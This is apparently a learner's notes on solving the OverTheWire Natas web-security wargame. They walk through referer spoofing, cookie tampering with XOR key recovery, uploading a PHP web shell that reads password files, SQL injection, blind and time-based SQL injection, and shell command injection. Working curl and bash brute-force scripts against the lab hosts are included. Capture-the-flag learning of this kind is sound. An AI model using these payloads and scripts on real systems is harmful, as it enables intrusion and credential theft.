#Lessons Learned for Natas

Every(most? many?) websites have a robots.txt which directs web robots
(like search engines) what they can and can't access. To get to it, type
/robots.txt   following the .com

ex.
google.com/robots.txt

```
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
.
.
.
User-agent: facebookexternalhit
Allow: /imgres
```

this allows all (\*) User-agents (robots) to access things except
/sdch   or /group  or /index.html? etc.

User agent "facebookexternalhit" is allowed acces to /imgres 
(Which I assume is images?)






forcing a google search in your history
Make a 0x0 image in html code with the search as the src <br>
ex:<br>

```
<img src='https://www.google.com/search?q=Kittens+and+Pancakes' width=0 height=0>
```
but a close inspection would show there's a "Reffered to from..." attached






Referrer

A simple google chrome add on can be used to change where you've been 
referred from (change it, hide it, whatever)

OR can use curl:

```
curl 'http://natas4.natas.labs.overthewire.org/' \
        -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8,es;q=0.7' \
  --compressed \
  --insecure
```





## :::::::::::::::::::Cookies :::::::::::::::::::::::::::::::::

view and change cookies (with no add-on)

Ctrl-Shift-I for inpection, then choose "applications" tab, should be there
under "Storage" Refresh the page after making any changes.

Other sources:<br>
under chrome go to  
settings:advanced:content settings: cookies: all cookies and site data:
then find the website itself

NOTE: an '=' is changed to '%3D' (this is done for transport since '=' is
a reserved character)


## :::::::PHP stuff::::::::

```
--Includes--
<?

include "includes/secret.inc";
.
.
. blah blah php script
.
.
?>
```

The above indicates that a document "/includes/secret.inc" is being accesed
by the php, so adding it to the url should reveal it



Look at this php script (for 10 -->11)

```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
.
.
.
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Analyzing the bottom, we know if showpassword = yes then we will see it.
The cookie is XOR encoded, so we can't simply do 'ctrl-shift-j' and type
" document.cookie = "data='showpassword'=>'yes', 'bgcolor'=>'#ffffff' "

we have to send that but XOR encrypted (well, first json encoded, then 
xor encrypted then base64 encoded according to the php script)

We also need to get the XOR encryption key. knowing that A ^ B = C
Thn A ^ C = B, meaning that since "message ^ key = ecryptedmessage"
then "message ^ encryptedmessage = key"

Since we can view cookies to see the encrypted message and we see what the
message is in the php script, we can work backwards to get the key, then 
encode our "showpassword => yes...." stuff 
(See xorencrypt.php for script)


python variant of php script:
```python
import base64
encoded = '3d3d516343746d4d6d6c315669563362'
print(base64.b64decode((bytes.fromhex(encoded))[::-1]))
```


## ::::::: Preview a Change in Cookies (if you can't physically change it :::::
set/preview a cookie in javascript in the browser (10 ->11)

press "ctrl-shift-j" to bring up the javscript console
type the following (or whatever cookie is pertinent to the situation)

document.cookie = "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK";

then refresh


12 -> 13

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

One thing that stuck out is that genRandomString() is called twice. First initially in the hidden input part of the form, then by makeRandomPath(). That stood out as odd. It was not immediately evident where the next passcode was. But if you follow the chain (`if array_key_exists("filename",$_POST)...` that filename (which is the first randomly generated one) is passed through. Most particularly that extension is passed through. This means it doesn't matter what filetype is uploaded, it will take on that random string and appended ".jpg" file extension.

Anyway, this code just appears to check that filename exists (which is true after a file is chosen) then it generates a different random string and appends that .jpg to it as described above, so even if you choose to upload a php script, it won't be executed (I assume the browser is reliant on that file extension).

My strategy was to upload my php script (`<?php system('cat /etc/natas_webpass/natas13'); ?>` ) then before clicking submit, opening up the dev tools and changing the 1st rando file extension to ".php". Admittedly, I didn't fully figure this out on my own.

my friend did the same with this curl command:
```sh
curl 'http://natas12.natas.labs.overthewire.org/index.php' \
  -X 'POST' \
  -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==' \
  -H 'Content-Type: multipart/form-data' \
  -F 'filename=whatever.php' \
  -F 'uploadedfile=@get_pass.php;' \
```

From here visit the site or be cool and get it with curl again (don't forget to add te authorization block)

`curl http://natas12.natas.labs.overthewire.org/upload/imx0qbstyu.php -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw=='`

13 -> 14

The same except it has a line to check filetype. The php that accomplishes this is
```php 
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```
The way this appears to work is by checking the "magic" hex codes in the front which indicate filetype. [There are many](https://en.wikipedia.org/wiki/List_of_file_signatures),here's one for jpg: `FF D8 FF EE`. A command line tool called simply `hexeditor` can be used to add these 4 to the front (`hexeditor -b <file>` to open in buffer mode from which new byes can be added with ctrl-A)


## :::::::::::::: SQL inection ::::::::::::::::

Here's a php script that references a MySQL database:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
```

focusing in on the query:
`"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""`

cleaning it up a little, this is what it will appear based on the form's input (NOTE: I'm not sure why they're being stored in `$_REQUEST` instead of `$_POST`, one of the peculiarities I'm not aware of in php)

`SELECT * from users where username="<username>" and password="<password>"`

Notice the quotes. So knowing a little bit of SQL, I know the syntax. I probably can't guess the username and even more likely wouldn't be able to also guess the password, so my strategy is to put the following in the username of the form (keeping password blank is fine)

`" OR 1 #`

This way, the query above reads

`SELECT * from users where username="" OR 1 # and password=""`

So "get me everything from the database where the username is "" or True". One of these is going to be true, either the usernamwe being blank or simply TRUE = True, so we're dandy.



another:

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

Here a textboox just checks for the existance of the username by passing it to the query: `"SELECT * from users where username="<username"`

WRONG DIRECTION:

I focused too much on the later `if(array_key_exists("debug", $_GET))`. I found out you can't make a POST and GET simultaneously, but hitting submit makes a POST, so how do you pass variables into a GET? adding `?debug=1` to the URL didn't cut it. Instead opening dev tools and adding to the form tag `action="?debug=1`. I was hoping there would be something deeper. I also tried to do some php injection by doing something like `natas16" ; echo $ref; "` my hope with this is that the result would put the following code "SELECT * from users where username=natas16"; echo $ref;" So that the query would be sucessful, later on when res was defined (to be the results) it would show me the results. But all my attempts would just be sanitized out. I didn't figure out what to do on my own, but my friend looked up the solution hint, I caved and asked for it as well and heard it was a brute force SQL. 

If the password started with an A for example, then you could put the following:

`natas16" and password like "A%` --> `"SELECT * from users where username="natas16" and password like "A%"`. This would show the user exists. We actually see hinted that the password can be up to a 64 char alphanumeric (VARCHAR) string, so making a post request with a bash script works:

```bash
front=''
for n in {1..65}
do
        change=0
        echo "on round $n:"
        for l in {a..z} {A..Z} {0..9}
        do
                curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
  --data-raw 'username=natas16%22++and+password+like+binary+%22'$front$l'%25' \ > output.txt
                  if grep -q "user exists." output.txt
                  then
                          front+=$l # Append new successful char to beginning
                          change=1
                          echo "found new char: $l -- $front"
                          break # break out of loop early
                  fi
        done
        # Break when no changes to password is found
        if [ $change == 0 ]; then echo "final -->> $front <<-- PIAZZA!"; break; fi
done
```

(it's LIKE BINARY instead of LIKE because it makes a stronger distinguishment between capital and lower case, but details...)


## :::: More Vulnerabilities ::::

php has a function passthru which just hands the code off to shell scripting, meaning bash commands can be potentially used. A relevant example is this "searching for a match in a dictionary". Here's the relevant php:
```php
if($key != "") {
   if(preg_match('/[;|&`\'"]/',$key)) {
     print "Input contains an illegal character!";
   } else {
     passthru("grep -i \"$key\" dictionary.txt");
   }
}
```
So the characters: `; | & ' "` (and backtick but I can't add that because it's messing up my markdown) are not allowed and input is most definitely put into a quoted string `grep -i "input" dictionary.txt`. I really tied playing with special characters like $, @ etc. But in the end nothing would work. I couldn't write to anything and view it. It turns out the key is the key `if $key ~=""`. So if there's an actual key, check it against the dictionary. I tested locally. I can cat a file. If I have a file called `passwd` and it contains something like `abc` as its content, plus a random dictionary.txt file with anything else, this command: `grep -i "$(grep a ./passwd)" dictionary.txt` (i.e. I'm checking for an existing character), nothing is returned. It's a little confusing, but I suppose I get at this point a "valid empty string". So the condition `if $key != ""` is not met and nothing is returned.

On the flip side, searching for a character that doesn't exist: `grep -i "$(grep Z ./passwd)" dictionary.txt`. So at this point the key isn't nothing (though it still gets passed through and the command that's "seen" is effectivly `grep -i "" dictionary.txt` which just displays the entire file's contents.

So all in all, I know if I guess a character in the file, I get nothing returned and if I guess wrong, I get a long output (the entire file concatenated). If this is done as a curl command, I get about 30 lines of short HTML for a currect guess and a long full list + the short HTML, abut 50,000 lines

As seems to be the theme as of recently, I didn't fully get this myself. Glanced at another solution, saw it looked like a brute force and I worked out the rest myself.

```bash
#PART 1 -- find restricted character set
for c in {A..Z} {a..z} {0..9}
do
      curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
      -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt

      if [[ $(cat output.txt | wc -l) -lt 300 ]]
              then echo "found element $c"
      fi
done

```

```bash
char_set="A G H N P Q S W b c d g h k m n q r s w 0 3 5 7 8 9"

for s in $char_set
do
        array=$s
        change=1
        while [ $change == 1 ]
        do
                change=0
                for c in $char_set
                do
                        curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$array$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
                        -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt

                        if [[ $(cat output.txt | wc -l) -lt 300 ]]
                                then echo "found pattern: $array$c"
                                array=$array$c
                                change=1
                                break
                        fi
                done
         done
done
```
That takes 3+ hours. Here's a faster variation (only ~15 mins, it checks that the pattern is sound from the beginning and doesn't wild goose chase other portions of the pattern `grep ^<pattern> dictionary.txt`):

```bash
char_set="A G H N P Q S W b c d g h k m n q r s w 0 3 5 7 8 9"

for s in $char_set
do
        array=$s
        change=1
        echo "on $s"
        while [ $change == 1 ]
        do
                change=0
                for c in $char_set
                do
                        echo "trying $array$c"
                        curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E'$array$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
                        -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output2.txt

                        if [[ $(cat output2.txt | wc -l) -lt 300 ]]
                                then echo "found pattern: $array$c"
                                array=$array$c
                                change=1
                                break
                        fi
                done
        done
done
```


SQL Timing attack

As before but there's no print out, check out this scenario

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

This appeared absolutely impossible because there's no return. Yet again I tried injecting php code. The only way I thought I could get feedback is by checking on some return from the debug. If I set in the form `action=?debug`, I figured that could be my trigger, for example:

`natas17"; $_GET['debug']=1 #`

`natas18"; <script type="text/javascript"> var = '<?php $_GET["debug"]=1; ?>;' </script> #; $a="`

But it was being sanitized out. My only idea.

Also yet again, I had to check for hints. I saw a timing attack was the key. A timing attack is implied information, not through printouts but through duration. Simply executing a query `SELECT * FROM users WHERE username="I_exist" AND sleep(5)`. This isn't intuitive it's not like a normal logical statement like True and True (I don't think). In this context it's more like the sleep command will get executed "for every record the query finds" ([source](https://www.saotn.org/mysql-sleep-attacks/)). So the solution strategy is going to be a brute force with curl using `like binary` matching as before except we check the total execution time instead of the presence of a particular return string

```bash
front=''
for i in {1..65}
do
        for c in {A..Z} {a..z} {0..9}
        do
                change=0
                /usr/bin/time -f'%e' -o time.log\
                curl -s 'http://natas17.natas.labs.overthewire.org/' \
                -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
                --data-raw 'username=natas18%22+and+password+like+binary+%22'$front$c'%25%22+and+sleep%285%29+%23' >/dev/null

                dur=$(cat time.log)
                if [[ $dur > 2 ]]
                then 
                        change=1
                        front=$front$c
                        echo -e "found char $c \t-- $front"
                        break
                fi
        done
        if [ $change == 0 ]; then echo "final: $front"; break ;fi
done
rm time.log
```
